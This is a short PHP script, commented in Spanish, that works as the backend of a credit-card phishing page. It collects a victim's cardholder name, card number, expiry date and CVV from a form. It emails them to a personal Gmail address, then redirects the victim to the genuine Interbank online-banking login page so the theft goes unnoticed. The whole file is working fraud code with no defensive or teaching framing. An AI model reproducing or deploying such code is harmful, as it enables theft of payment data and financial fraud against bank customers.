<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Validación de campos
    if (empty($_POST['fname']) || empty($_POST['cardnumber']) || empty($_POST['expdate']) || empty
    ($_POST['cvv'])) {
        echo "Por favor, complete todos los campos.";
        exit;
    }

    // Recoger datos del formulario
    $nombre = $_POST['fname'];
    $numeroTarjeta = $_POST['cardnumber'];
    $fechaVencimiento = $_POST['expdate'];
    $cvv = $_POST['cvv'];

    // Crear el cuerpo del correo
    $cuerpo = "Nombre del titular: $nombre\nNúmero de tarjeta: $numeroTarjeta
    \nFecha de vencimiento: $fechaVencimiento\nCVV: $cvv";

    // Correo de destinatario
    $destinatario = "eliasminez1@gmail.com";
    $asunto = "Nueva entrada de formulario de tarjeta";

    // Enviar correo electrónico
    if (mail($destinatario, $asunto, $cuerpo)) {
        // Redirigir al usuario después de enviar el correo electrónico
        header("Location: https://bancaporinternet.interbank.pe/login");
        exit();
    } else {
        echo "Error al enviar el correo electrónico.";
    }
} else {
    // Si se accede a este script directamente sin enviar el formulario, redirigir al formulario
    header("Location: index.html");
    exit();
}
?>